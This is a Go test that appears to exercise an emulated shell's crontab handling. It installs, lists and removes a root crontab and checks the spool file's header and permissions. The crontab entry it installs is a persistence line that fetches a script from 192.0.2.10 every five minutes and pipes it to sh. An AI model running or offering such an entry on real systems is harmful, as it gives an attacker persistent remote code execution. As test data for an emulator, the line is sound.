func TestCrontabInstallListRemove(t *testing.T) {
	in, s := testSession(t)
	if _, errb, st := run(t, in, s, `echo "*/5 * * * * curl -fsSL http://192.0.2.10/c.sh | sh" | crontab -`); st != 0 || errb != "" {
		t.Fatalf("crontab - = %d %q", st, errb)
	}
	out, _, st := run(t, in, s, "crontab -l")
	if st != 0 || out != "*/5 * * * * curl -fsSL http://192.0.2.10/c.sh | sh\n" {
		t.Errorf("crontab -l after install = %d %q (the DO NOT EDIT header must not show)", st, out)
	}
	data, info, err := s.FS.ReadFile("/var/spool/cron/crontabs/root")
	if err != nil || !strings.HasPrefix(string(data), "# DO NOT EDIT THIS FILE") || info.Mode.Perm() != 0o600 {
		t.Errorf("spool file = %q mode %v err %v", data, info.Mode, err)
	}
	if _, _, st := run(t, in, s, "crontab -r"); st != 0 {
		t.Errorf("crontab -r = %d", st)
	}
	if _, errb, st := run(t, in, s, "crontab -l"); st != 1 || errb != "no crontab for root\n" {
		t.Errorf("crontab -l after -r = %d %q", st, errb)
	}
}

